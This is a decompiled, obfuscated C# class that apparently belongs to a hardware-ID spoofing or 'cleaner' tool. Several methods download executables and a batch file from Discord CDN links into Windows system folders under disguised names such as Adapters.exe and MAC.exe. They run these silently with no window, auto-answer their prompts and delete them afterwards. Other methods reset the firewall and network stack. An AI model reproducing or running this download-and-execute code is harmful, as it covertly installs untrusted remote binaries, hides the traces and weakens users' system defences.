using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;

internal class Class16
{
	public static void smethod_0()
	{
		_003CModule_003E.Class0.smethod_0();
		if (!File.Exists("C:\\Windows\\Adapters.exe"))
		{
			smethod_8();
			Thread.Sleep(3000);
			WebClient webClient = new WebClient();
			webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/704851400882126929/704853003550851102/DarkCleaner.exe", "C:\\Windows\\Adapters.exe");
			webClient.Proxy = null;
			Thread.Sleep(3000);
			Process process = new Process();
			process.StartInfo.RedirectStandardInput = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.FileName = "C:\\Windows\\Adapters.exe";
			process.Start();
			process.StandardInput.WriteLine("Y");
			process.WaitForExit();
			Thread.Sleep(1800);
			Process process2 = new Process();
			process2.StartInfo.RedirectStandardInput = true;
			process2.StartInfo.UseShellExecute = false;
			process2.StartInfo.CreateNoWindow = true;
			process2.StartInfo.FileName = "cmd.exe";
			process2.Start();
			process2.StandardInput.WriteLine("cd C:\\Windows\\Speech");
			process2.StandardInput.WriteLine("devcon rescan");
			Thread.Sleep(1000);
			process2.Close();
			Thread.Sleep(2500);
			File.Delete("C:\\Windows\\Speech\\devcon.exe");
			File.Delete("C:\\Windows\\Adapters.exe");
		}
		else
		{
			smethod_8();
			Process process3 = new Process();
			process3.StartInfo.RedirectStandardInput = true;
			process3.StartInfo.UseShellExecute = false;
			process3.StartInfo.CreateNoWindow = true;
			process3.StartInfo.FileName = "C:\\Windows\\Adapters.exe";
			process3.Start();
			process3.StandardInput.WriteLine("Y");
			process3.WaitForExit();
			Thread.Sleep(1800);
			Process process4 = new Process();
			process4.StartInfo.RedirectStandardInput = true;
			process4.StartInfo.UseShellExecute = false;
			process4.StartInfo.CreateNoWindow = true;
			process4.StartInfo.FileName = "cmd.exe";
			process4.Start();
			process4.StandardInput.WriteLine("cd C:\\Windows");
			process4.StandardInput.WriteLine("devcon rescan");
			Thread.Sleep(1000);
			process4.Close();
			Thread.Sleep(3000);
			File.Delete("C:\\Windows\\devcon.exe");
			File.Delete("C:\\Windows\\Adapters.exe");
		}
	}

	public static void smethod_1()
	{
		_003CModule_003E.Class0.smethod_0();
		WebClient webClient = new WebClient();
		webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");
		webClient.DownloadFile("https://cdn.discordapp.com/attachments/661208670897438731/718630553305350205/DarkCleanerEX.exe", "C:\\Program Files\\Adapters.exe");
	}

	public static void smethod_2()
	{
		_003CModule_003E.Class0.smethod_0();
		WebClient webClient = new WebClient();
		webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");
		webClient.DownloadFile("https://cdn.discordapp.com/attachments/661208670897438731/718630460045000745/8y.exe", "C:\\Windows\\Speech\\MAC.exe");
	}

	public static void smethod_3()
	{
		_003CModule_003E.Class0.smethod_0();
		WebClient webClient = new WebClient();
		webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");
		webClient.Proxy = null;
		Process process = new Process();
		process.StartInfo.CreateNoWindow = true;
		process.StartInfo.RedirectStandardInput = true;
		process.StartInfo.UseShellExecute = false;
		process.StartInfo.FileName = "C:\\Windows\\Speech\\MAC.exe";
		process.Start();
		process.WaitForExit();
		File.Delete("C:\\Windows\\Speech\\MAC.exe");
		Thread.Sleep(4000);
	}

	public static void smethod_4()
	{
		_003CModule_003E.Class0.smethod_0();
		WebClient webClient = new WebClient();
		webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");
		webClient.DownloadFile("https://cdn.discordapp.com/attachments/661208670897438731/718630709962735666/net.exe", "C:\\Windows\\Speech\\net.exe");
		webClient.Proxy = null;
		Process process = new Process();
		process.StartInfo.CreateNoWindow = true;
		process.StartInfo.RedirectStandardInput = true;
		process.StartInfo.UseShellExecute = false;
		process.StartInfo.FileName = "C:\\Windows\\Speech\\net.exe";
		process.Start();
		process.WaitForExit();
		File.Delete("C:\\Windows\\Speech\\net.exe");
		Thread.Sleep(4000);
	}

	public static void smethod_5()
	{
		_003CModule_003E.Class0.smethod_0();
		WebClient webClient = new WebClient();
		webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");
		webClient.DownloadFile("https://cdn.discordapp.com/attachments/661208670897438731/718630644787445790/GetSerials.bat", "C:\\Windows\\Speech\\hwidwinver.bat");
		webClient.Proxy = null;
	}

	public static void smethod_6()
	{
		_003CModule_003E.Class0.smethod_0();
		Process process = new Process();
		process.StartInfo.FileName = "C:\\Windows\\Speech\\hwidwinver.bat";
		process.Start();
	}

	public static void smethod_7()
	{
		_003CModule_003E.Class0.smethod_0();
		smethod_10("ipconfig /release");
		smethod_10("ipconfig /renew");
		smethod_10("ipconfig /flushdns");
		smethod_10("netsh advfirewall reset");
		smethod_10("netsh int ipv6 reset");
		smethod_10("netsh winsock reset");
		smethod_10("netsh int ip reset");
	}

	public static void smethod_8()
	{
		_003CModule_003E.Class0.smethod_0();
		WebClient webClient = new WebClient();
		webClient.DownloadFile("https://cdn.discordapp.com/attachments/704851400882126929/704853621010858087/n6.exe", "C:\\Windows\\Speech\\devcon.exe");
		webClient.Proxy = null;
	}

	public static PhysicalAddress smethod_9()
	{
		_003CModule_003E.Class0.smethod_0();
		NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
		foreach (NetworkInterface networkInterface in allNetworkInterfaces)
		{
			if (networkInterface.NetworkInterfaceType == NetworkInterfaceType.Ethernet && networkInterface.OperationalStatus == OperationalStatus.Up)
			{
				return networkInterface.GetPhysicalAddress();
			}
		}
		return null;
	}

	private static void smethod_10(string string_0)
	{
		_003CModule_003E.Class0.smethod_0();
		Process process = Process.Start(new ProcessStartInfo("cmd.exe", "/c " + string_0)
		{
			CreateNoWindow = true,
			UseShellExecute = false,
			RedirectStandardError = true,
			RedirectStandardOutput = true
		});
		process.WaitForExit();
		process.StandardOutput.ReadToEnd();
		process.StandardError.ReadToEnd();
		_ = process.ExitCode;
		process.Close();
	}

	public Class16()
	{
		_003CModule_003E.Class0.smethod_0();
		base._002Ector();
	}

	static object smethod_15(object object_0)
	{
		return ((Process)object_0).StartInfo;
	}

	static void smethod_17(object object_0, bool bool_0)
	{
		((ProcessStartInfo)object_0).UseShellExecute = bool_0;
	}

	static void smethod_18(object object_0, bool bool_0)
	{
		((ProcessStartInfo)object_0).CreateNoWindow = bool_0;
	}

	static void smethod_19(object object_0, string string_0)
	{
		((ProcessStartInfo)object_0).FileName = string_0;
	}

	static bool smethod_20(object object_0)
	{
		return ((Process)object_0).Start();
	}

	static object smethod_28(object object_0)
	{
		return ((WebClient)object_0).Headers;
	}

	static void smethod_29(object object_0, string string_0, string string_1)
	{
		((NameValueCollection)object_0).Add(string_0, string_1);
	}

	static void smethod_30(object object_0, string string_0, string string_1)
	{
		((WebClient)object_0).DownloadFile(string_0, string_1);
	}

	static void smethod_38(object object_0, bool bool_0)
	{
		((ProcessStartInfo)object_0).RedirectStandardError = bool_0;
	}

	static void smethod_39(object object_0, bool bool_0)
	{
		((ProcessStartInfo)object_0).RedirectStandardOutput = bool_0;
	}

	static object smethod_40(ProcessStartInfo processStartInfo_0)
	{
		return Process.Start(processStartInfo_0);
	}
}
